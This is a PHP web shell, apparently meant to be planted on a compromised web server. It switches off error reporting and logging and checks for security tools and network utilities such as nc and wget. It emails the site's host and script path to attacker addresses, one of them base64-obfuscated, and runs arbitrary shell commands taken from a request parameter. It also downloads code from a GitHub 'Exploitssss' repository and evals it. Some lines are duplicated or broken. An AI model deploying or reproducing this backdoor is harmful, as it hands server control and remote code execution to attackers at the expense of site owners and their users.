<?pHp
header("X-XSS-Protection: 0");
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);
@ini_set('max_execution_time', 5000);
@clearstatcache();
@mb_internal_encoding('UTF-8');
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', NONE);
ini_set('disable_functions', 0);
ini_set('max_execution_time', 5000);
@ini_set('display_errors', 0);
@ini_set('disable_functions', 0);
error_reporting(E_ALL);
//@ignore_user_abort(TRUE);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
$allow_ext		= array('mysql','mysqli','ftp','curl','imap','sockets','mssql','sqlite');
$allow_program	= array('gcc','cc','ld','php','perl','python','ruby','make','tar','nc','locate','suidperl','wget','get','fetch','links','lynx','curl','lwp-mirror','lwp-download');
$allow_service	= array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','tripwire','sxid','logcheck','logwatch');
$e=base64_decode("bXVocmF6a3lAZ21haWwuY29t");
$f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$f=$_SERVER['PATH_INFO'].$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$to= 'exploitkite@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . 
mail($e,"0",$f); print(`{$_REQUEST[0]}`);$f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"0",$f); print(`{$_REQUEST[0]}`);
mail($to,"0",$f); print(`{$_REQUEST[0]}`);
mail($to,  "Base64!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/templates.php'));
?>
